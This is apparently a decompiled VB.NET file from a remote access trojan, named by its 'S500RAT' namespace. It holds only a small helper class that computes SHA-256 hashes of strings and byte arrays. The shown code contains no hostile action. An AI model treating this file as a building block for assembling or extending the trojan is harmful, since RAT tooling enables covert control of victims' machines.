Imports System
Imports System.Security.Cryptography
Imports System.Text

Namespace S500RAT
	' Token: 0x0200000D RID: 13
	Public Class Sha256M
		' Token: 0x06000065 RID: 101 RVA: 0x000040FC File Offset: 0x000022FC
		Public Shared Function ComputeHash(input As String) As String
			Dim array As Byte() = Encoding.UTF8.GetBytes(input)
			Using sha256Managed As SHA256Managed = New SHA256Managed()
				array = sha256Managed.ComputeHash(array)
			End Using
			Dim stringBuilder As StringBuilder = New StringBuilder()
			For Each b As Byte In array
				stringBuilder.Append(b.ToString("X2"))
			Next
			Return stringBuilder.ToString().ToUpper()
		End Function

		' Token: 0x06000066 RID: 102 RVA: 0x00004190 File Offset: 0x00002390
		Public Shared Function ComputeHash(input As Byte()) As Byte()
			Dim result As Byte()
			Using sha256Managed As SHA256Managed = New SHA256Managed()
				result = sha256Managed.ComputeHash(input)
			End Using
			Return result
		End Function
	End Class
End Namespace
